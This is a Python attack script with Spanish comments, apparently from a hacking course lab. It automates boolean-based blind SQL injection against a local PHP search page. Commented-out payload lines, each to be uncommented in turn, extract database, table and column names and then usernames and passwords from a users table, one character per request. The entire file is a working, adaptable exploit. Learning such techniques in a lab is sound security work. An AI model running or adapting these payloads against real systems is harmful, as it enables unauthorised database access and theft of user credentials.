#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Datos extraídos")

    extracted_info = ""

    for position in range(1, 150):
        for character in range(33,126):

            # Obtener el nombre de las bases de datos existentes
            # sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)

            # Obtener el nombre de las tablas dentro de la base de datos
            # base_de_datos = 'Hack4u' # Modificar esto
            #sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema='%s'),%d,1)) from dual)=%d)" % (base_de_datos, position, character)

            # Obtener el nombre de las columnas sabiendo la tabla
            # tabla = 'users' # Modificar esto
            # sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(column_name) from information_schema.columns where table_name='%s'),%d,1)) from dual)=%d)" % (tabla, position, character)

            #Obtener todos los usuarios y contraseñas (por ejemplo)
            #sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)

            # p1.status(sqli_url)

            r = requests.get(sqli_url)

            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break


if __name__ == '__main__':

    makeSQLI()
